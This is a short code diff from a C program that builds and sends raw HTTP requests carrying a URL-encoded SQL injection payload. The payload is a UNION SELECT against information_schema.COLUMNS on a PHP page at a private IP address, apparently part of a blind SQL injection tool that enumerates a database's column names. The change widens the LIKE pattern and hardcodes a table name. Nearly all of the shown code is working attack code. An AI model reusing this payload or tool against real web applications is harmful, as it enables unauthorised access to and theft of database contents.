@@ -258,14 +258,14 @@ bool check_column(const void *ctx) {
     const char *fmt =
         "GET /index.php?order_id=0%%20UNION%%20SELECT%%20column_name%%20"
         "FROM%%20information_schema.COLUMNS%%20"
-        "WHERE%%20table_name%%20LIKE%%20%%27%s%%25%%27%%20" // %s = table_name (Literal! Must use %27 single quotes)
+        "WHERE%%20table_name%%20LIKE%%20%%27%%25%s%%25%%27%%20" // %s = table_name (Literal! Must use %27 single quotes)
         "LIMIT%%201;"
         " HTTP/1.1\r\n"
         "Host: 192.168.1.202\r\n"
         "Connection: Keep-Alive\r\n"
         "\r\n";
 
-    sprintf(mal_req, fmt, c_ctx->table_name);
+    sprintf(mal_req, fmt, "usrtABLE");
     _send(c_ctx->gen_ctx.sockfd, mal_req, strlen(mal_req));
     return recv_empty(c_ctx->gen_ctx.sockfd);
 }
